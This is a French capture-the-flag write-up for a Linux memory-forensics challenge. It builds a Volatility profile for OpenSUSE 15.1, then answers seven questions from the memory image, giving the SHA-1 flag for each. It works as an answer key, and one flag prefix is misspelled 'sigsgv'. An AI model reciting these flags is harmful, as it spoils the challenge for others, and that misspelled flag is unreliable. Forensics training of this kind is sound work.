&lt;p&gt;Nous possédons alors la bonne version de la distribution (OpenSUSE 15.1) ainsi que le bon kernel ( &lt;code class=&quot;highlighter-rouge&quot;&gt;4.12.14-lp151.28.32-default&lt;/code&gt;). On peut donc passer à la création de notre profil.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;création-du-profil&quot;&gt;Création du profil&lt;/h2&gt;

&lt;hr /&gt;

&lt;p&gt;Nous allons utiliser &lt;a href=&quot;https://github.com/volatilityfoundation/volatility/wiki/Linux&quot;&gt;cette page&lt;/a&gt; du wiki de Volatility qui explique comment créer un profil sous Linux.&lt;/p&gt;

&lt;h3 id=&quot;installation-des-dépendances&quot;&gt;Installation des dépendances&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# OpenSUSES 15.1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;zypper &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;libdwarf-tools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;installation-de-volatility&quot;&gt;Installation de Volatility&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# OpenSUSES 15.1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;zypper &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;git
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/volatilityfoundation/volatility
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;création-du-profil-1&quot;&gt;Création du profil&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# OpenSUSES 15.1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;volatility/tools/linux/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make
make &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; //lib/modules/4.12.14-lp151.28.32-default/build &lt;span class=&quot;nv&quot;&gt;CONFIG_DEBUG_INFO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;y &lt;span class=&quot;nv&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/user/volatility/tools/linux&quot;&lt;/span&gt; modules
make[1]: &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; //lib/modules/4.12.14-lp151.28.32-default/build: No such file or directory.  Stop.
make: &lt;span class=&quot;k&quot;&gt;***&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Makefile:10: dwarf] Error 2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lors de la création du profil, nous avons une erreur de compilation, en effet, il manque le dossier &lt;code class=&quot;highlighter-rouge&quot;&gt;/build&lt;/code&gt;dans &lt;code class=&quot;highlighter-rouge&quot;&gt;/lib/modules/4.12.14-lp151.28.32-default&lt;/code&gt;…&lt;/p&gt;

&lt;p&gt;Après quelques recherches on tombe sur &lt;a href=&quot;https://forums.opensuse.org/showthread.php/456113-lib-modules-2-6-34-12-desktop-build-No-such-file-or-directory-Stop-Error-!&quot;&gt;ce post&lt;/a&gt; d’un forum sur OpenSUSE.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;I tried to resolve it by installing &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel-source&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel-devel&lt;/code&gt; packages&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;On y apprend qu’on peut essayer d’installer le package &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel-devel&lt;/code&gt; pour avoir un dossier &lt;code class=&quot;highlighter-rouge&quot;&gt;/build&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# OpenSUSES 15.1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;zypper &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;kernel-devel
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make
make &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; //lib/modules/4.12.14-lp151.28.32-default/build &lt;span class=&quot;nv&quot;&gt;CONFIG_DEBUG_INFO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;y &lt;span class=&quot;nv&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/user/volatility/tools/linux&quot;&lt;/span&gt; modules
make[1]: Entering directory &lt;span class=&quot;s1&quot;&gt;'/usr/src/linux-4.12.14-lp151.28.32-obj/x86_64/default'&lt;/span&gt;
  CC &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M]  /home/user/volatility/tools/linux/module.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/user/volatility/tools/linux/module.mod.o
  LD &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M]  /home/user/volatility/tools/linux/module.ko
make[1]: Leaving directory &lt;span class=&quot;s1&quot;&gt;'/usr/src/linux-4.12.14-lp151.28.32-obj/x86_64/default'&lt;/span&gt;
dwarfdump &lt;span class=&quot;nt&quot;&gt;-di&lt;/span&gt; module.ko &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; module.dwarf
make &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; //lib/modules/4.12.14-lp151.28.32-default/build &lt;span class=&quot;nv&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/user/volatility/tools/linux&quot;&lt;/span&gt; clean
make[1]: Entering directory &lt;span class=&quot;s1&quot;&gt;'/usr/src/linux-4.12.14-lp151.28.32-obj/x86_64/default'&lt;/span&gt;
  CLEAN   /home/user/volatility/tools/linux/.tmp_versions
  CLEAN   /home/user/volatility/tools/linux/Module.symvers
make[1]: Leaving directory &lt;span class=&quot;s1&quot;&gt;'/usr/src/linux-4.12.14-lp151.28.32-obj/x86_64/default'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# OpenSUSES 15.1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;zypper &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;zip
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;zip OpenSUSE151.zip volatility/tools/linux/module.dwarf /boot/System.map-4.12.14-lp151.28.32-default
  adding: volatility/tools/linux/module.dwarf &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;deflated 91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  adding: boot/System.map-4.12.14-lp151.28.32-default &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;deflated 79%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La compilation s’est bien passée, notre profil est maintenant prêt. Pour terminer, nous devons créer un zip (&lt;code class=&quot;highlighter-rouge&quot;&gt;OpenSUSE151.zip&lt;/code&gt;) avec les fichiers nécessaires. Il ne reste plus qu’à l’envoyer sur notre machine de travail.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# hôte&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;socat tcp-listen:7777 - &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; OpenSUSE151.zip

&lt;span class=&quot;c&quot;&gt;# OpenSUSES 15.1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo cat &lt;/span&gt;OpenSUSE151.zip | nc &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; 192.168.56.1 7777
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;utiliser-le-profil&quot;&gt;Utiliser le profil&lt;/h2&gt;

&lt;hr /&gt;

&lt;p&gt;On peut maintenant ajouter notre profil à Volatility.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;To create the profile, place both the &lt;code class=&quot;highlighter-rouge&quot;&gt;module.dwarf&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;system.map&lt;/code&gt; file into a zip file. Then move this zip file under &lt;code class=&quot;highlighter-rouge&quot;&gt;volatility/plugins/overlays/linux/&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;OpenSUSE151.zip /opt/volatility/volatility/plugins/overlays/linux/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;--info&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Linux'&lt;/span&gt;
...
LinuxOpenSUSE151x64   - A Profile &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux OpenSUSE151 x64
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On peut maintenant utiliser Volatility pour manipuler notre image.&lt;/p&gt;

&lt;p&gt;L’option &lt;code class=&quot;highlighter-rouge&quot;&gt;--info&lt;/code&gt; permet d’avoir de nombreuses informations, notamment les profils supportés, on retrouve bien notre profil sous le nom &lt;code class=&quot;highlighter-rouge&quot;&gt;LinuxOpenSUSE151x64&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Pour trouver les bonnes informations pour chaque question, nous allons utiliser &lt;a href=&quot;https://github.com/volatilityfoundation/volatility/wiki/Linux-Command-Reference&quot;&gt;cette page du wiki&lt;/a&gt;. Cette dernière permet de ne pas se perdre parmis les nombreuses commandes de Volatility.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Question n°1&lt;/strong&gt;: Quelle est la commande que noraj a utilisé à &lt;code class=&quot;highlighter-rouge&quot;&gt;2019-11-19 22:57:38 UTC+0000&lt;/code&gt;?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;linux_bash&lt;/code&gt; - Recover bash history from bash process memory&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; chall.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxOpenSUSE151x64 linux_bash
Pid   Name      Command Time                 Command
&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
...
1498   bash    2019-11-19 22:57:38 UTC+0000  python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 1337
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'python3 -m http.server 1337'&lt;/span&gt; | openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
1d4893cc25cc5453be125227fb8ac34988c29ad0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv{1d4893cc25cc5453be125227fb8ac34988c29ad0}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Question n°2&lt;/strong&gt;: Quelle version de &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt; a été utilisée pour compiler le kernel ? (string entière)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;linux_banner&lt;/code&gt;- Prints the Linux banner information&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; chall.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxOpenSUSE151x64 linux_banner
Linux version 4.12.14-lp151.28.32-default &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;geeko@buildhost&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gcc version 7.4.1 20190905 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;gcc-7-branch revision 275407] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SUSE Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#1 SMP Wed Nov 13 07:50:15 UTC 2019 (6e1aaad)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'gcc version 7.4.1 20190905 [gcc-7-branch revision 275407] (SUSE Linux)'&lt;/span&gt; | openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
524993e05b0ded8e112a134c68d04b319de13423
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsgv{524993e05b0ded8e112a134c68d04b319de13423}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Question n°3&lt;/strong&gt;: Quel est le message de debug à &lt;code class=&quot;highlighter-rouge&quot;&gt;1105416124.1&lt;/code&gt;?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;linux_dmesg&lt;/code&gt;- Gather dmesg buffer&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; chall.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxOpenSUSE151x64 linux_dmesg | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1105416124.1'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1105416124.1]   Magic number: 11:134:907
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Magic number: 11:134:907'&lt;/span&gt; | openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
77038af8d03d8b4cdb28e6e592b87a2c3195d1fe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv{77038af8d03d8b4cdb28e6e592b87a2c3195d1fe}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Question n°4&lt;/strong&gt;: Quelle est l’adresse IP de &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt; et son adresse MAC ? (concatène la réponse)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;linux_ifconfig&lt;/code&gt;- Gathers active interfaces&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; chall.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxOpenSUSE151x64 linux_ifconfig
Interface   IP Address         MAC Address        Promiscous Mode
&lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;
lo          127.0.0.1          00:00:00:00:00:00  False
eth0        192.168.1.94       08:00:27:93:fe:6c  False
lo          127.0.0.1          00:00:00:00:00:00  False
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'192.168.1.9408:00:27:93:fe:6c'&lt;/span&gt; | openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
cba34462a24124ada4e4882a4db5104b254343f8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv{cba34462a24124ada4e4882a4db5104b254343f8}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Question n°5&lt;/strong&gt;: Quelle est la 3ème bibliothèque chargée par &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd&lt;/code&gt;? (chemin entier)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;linux_library_list&lt;/code&gt;- Lists libraries loaded into a process&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; chall.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxOpenSUSE151x64 linux_library_list | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sshd'&lt;/span&gt;
Task          Pid      Load Address       Path
&lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
sshd         1271 0x00007f0e8ec8a000 /usr/lib64/libgpg-error.so.0
sshd         1271 0x00007f0e8eeaa000 /lib64/libresolv.so.2
sshd         1271 0x00007f0e8f0c1000 /usr/lib64/libkeyutils.so.1
sshd         1271 0x00007f0e8f2c5000 /usr/lib64/libkrb5support.so.0
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/usr/lib64/libkeyutils.so.1'&lt;/span&gt; | openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
bcf5ae7945ce4e711d11861ec2cc1f75efbe758b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv{bcf5ae7945ce4e711d11861ec2cc1f75efbe758b}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Question n°6&lt;/strong&gt;: Quels sont le système de fichier et les options de montage de &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;? (concatène la réponse)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; chall.raw | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/tmp'&lt;/span&gt;
/@/tmp /tmp rw,relatime shared:32 - btrfs /dev/sda2 rw,space_cache,subvolid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;260,subvol&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/@/tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'btrfsrw,relatime'&lt;/span&gt; | openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
d27802b77f4a14b3745ab47aaa86cfdc3c231394
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv{d27802b77f4a14b3745ab47aaa86cfdc3c231394}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Question n°7&lt;/strong&gt;: Quels sont le nom/pid du processus qui utilise le socket &lt;code class=&quot;highlighter-rouge&quot;&gt;UNIX 18707&lt;/code&gt;?&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;linux_lsof&lt;/code&gt;- Lists file descriptors and their path&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; chall.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;LinuxOpenSUSE151x64 linux_lsof
Offset             Name             Pid      FD    Path
&lt;span class=&quot;nt&quot;&gt;------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
...
0xffff88000c2481c0 wickedd-nanny    866      4      socket:[18707]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wickedd-nanny/866'&lt;/span&gt; | openssl dgst &lt;span class=&quot;nt&quot;&gt;-sha1&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;
6b95288247a023c860fe0848f3990cc25ce7d697
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv{6b95288247a023c860fe0848f3990cc25ce7d697}&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

